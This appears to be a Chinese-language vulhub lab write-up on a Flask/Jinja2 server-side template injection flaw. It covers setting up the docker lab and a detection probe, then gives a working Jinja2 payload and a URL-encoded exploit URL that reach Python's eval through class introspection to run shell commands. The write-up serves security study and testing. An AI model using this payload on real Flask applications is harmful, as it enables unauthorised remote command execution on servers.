# CVE-2019-8341 Flask（Jinja2） 服务端模板注入漏洞

Flask服务的模板中拼接了恶意用户输入导致各种漏洞

- 在模板环境中注册函数，可访问python中的一些内置函数及其方法；
- 可利用Python 沙盒环境逃逸绕过注册方式，进而调用python内置对象；

## 应用介绍

Flask是一个微型的Python开发的Web框架，基于Werkzeug WSGI工具箱和Jinja2 模板引擎。 
Flask使用起来非常简单，应用Extension增加其他功能：ORM、窗体验证工具、文件上传、各种开放式身份验证技术。

## 环境构建

```shell
cd ~/vulhub/flask/ssti
docker-compose up -d

# 删除容器
docker-compose down -v
```
不报错就说明启动成功，可以通过 `docker ps` 命令查看活动容器的状态。

## 漏洞相关知识

```
__bases__    #以元组返回一个类直接所继承的类
__mro__      #以元组返回继承关系链
__class__    #返回对象所属的类
__globals__  #以dict返回函数所在模块命名空间中的所有变量
__subclasses__()  #以列表返回类的子类
_builtin_  #内建函数，python中可以直接运行一些函数，例如int(),list()等等，这些函数可以在__builtins__中可以查到。

补充：在py3中__builtin__被换成了builtin
```

## 手工检测方式

访问 `http://X.X.X.X:8000/?name={{2*3}}`

![](https://cdn.jsdelivr.net/gh/TesterCC/pic_bed2/20210629132531.png)


看下payload格式化后的内容：
```
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

![](https://cdn.jsdelivr.net/gh/TesterCC/pic_bed2/20210629134247.png)

EXP:
```
http://127.0.0.1:5000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22calc%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D
```